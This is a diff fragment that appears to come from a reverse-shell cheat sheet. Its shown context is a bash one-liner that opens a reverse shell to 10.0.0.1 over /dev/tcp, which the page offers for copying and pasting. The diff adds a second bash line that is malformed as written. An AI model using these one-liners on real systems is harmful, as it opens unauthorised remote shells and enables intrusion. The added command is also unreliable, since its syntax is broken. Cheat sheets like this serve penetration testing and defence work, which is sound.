@@ -26,6 +26,8 @@ Each of the methods below is aimed to be a one-liner that you can copy/paste.  A
 Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
 
 	bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+    
+	exec /bin/bash 0&0 2>&0
 
 # PERL
 
